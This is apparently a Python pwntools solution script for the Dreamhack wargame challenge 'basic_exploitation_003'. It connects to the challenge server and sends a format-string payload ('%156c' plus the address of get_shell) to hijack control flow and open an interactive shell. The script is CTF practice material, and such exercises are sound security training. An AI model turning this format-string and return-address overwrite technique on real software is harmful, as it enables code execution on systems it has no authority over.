from pwn import *

#p = process('./basic_exploitation_003')
#gdb.attach(p,gdb_args=['-q','-ex init-pwngdb'])
p = remote('host1.dreamhack.games', 15097)

context.clear()
context.update(arch='i386', os='linux')
context.log_level='debug'

e = ELF('./basic_exploitation_003')
getshell = e.symbols['get_shell']

print 'getshell : ', hex(e.symbols['get_shell'])

payload = ''
payload += "%156c"
payload += p32(getshell)
print len(payload)

p.send(payload)

p.interactive()
